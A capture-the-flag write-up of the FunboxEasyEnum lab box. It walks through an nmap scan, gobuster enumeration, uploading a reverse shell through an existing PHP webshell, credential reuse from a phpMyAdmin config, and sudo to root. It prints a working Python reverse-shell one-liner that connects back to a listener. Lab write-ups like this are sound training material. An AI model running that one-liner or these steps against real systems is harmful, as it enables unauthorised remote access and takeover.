---
layout: default
title : muzec - FunboxEasyEnum Writeup
---

![image](https://user-images.githubusercontent.com/69868171/115975817-230fff00-a536-11eb-99fa-04db4cc12c16.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Sun Apr 11 12:41:03 2021 as: nmap -sC -sV -oA nmap 192.168.209.132
Nmap scan report for 192.168.209.132
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
|_  256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
80/tcp   open     http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
9040/tcp filtered tor-trans
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 11 12:41:57 2021 -- 1 IP address (1 host up) scanned in 53.70 seconds
```

We got 2 open ports only so let hit the port 80 with some directory bursting using gobuster.

![image](https://user-images.githubusercontent.com/69868171/115975943-02947480-a537-11eb-922d-4c2c01a291b1.png)

Cool a directory mini.php let check it out.

![image](https://user-images.githubusercontent.com/69868171/115975966-48513d00-a537-11eb-8be4-b75e43ed434d.png)

Wow it a mini webshell and guess what we can upload a reverse shell to get a shell back to our terminal ok let do something cool.

![image](https://user-images.githubusercontent.com/69868171/115976006-9e25e500-a537-11eb-8917-19b53f01bcb9.png)


Ok let save in a php file and upload it on the mini webshell.

![image](https://user-images.githubusercontent.com/69868171/115976029-c44b8500-a537-11eb-80e8-b46dea6fae59.png)

Now let access it.

![image](https://user-images.githubusercontent.com/69868171/115976049-05439980-a538-11eb-9051-fe7f8dee2793.png)


Boom we have Remote code execution now let use `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` to get our shell.

Note:- edit the IP and port to your ncat listener.

![image](https://user-images.githubusercontent.com/69868171/115976110-a7fc1800-a538-11eb-83d7-dac92de83e96.png)


And we have shell.

![image](https://user-images.githubusercontent.com/69868171/115976127-cbbf5e00-a538-11eb-90f1-b7e1a07012f7.png)

Going to the home directory found nothing interesting so i get linpeas.sh to the target machine.

![image](https://user-images.githubusercontent.com/69868171/115976201-84859d00-a539-11eb-913f-9e94243ff615.png)

Found a config file for phpmyadmin with some credentials.

![image](https://user-images.githubusercontent.com/69868171/115976236-e5ad7080-a539-11eb-86fa-60c6fb19f90a.png)

I try going through the MYSQL databases but everything is empty so i try reusing the credentials for the users available on the target machine.

![image](https://user-images.githubusercontent.com/69868171/115976288-58b6e700-a53a-11eb-8b11-d84a26cd0fa0.png)

Boom we are in now let try checking `sudo -l` .

![image](https://user-images.githubusercontent.com/69868171/115976315-bb0fe780-a53a-11eb-8214-8cd97b468e81.png)

Cool we can run sudo all and we are root.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>

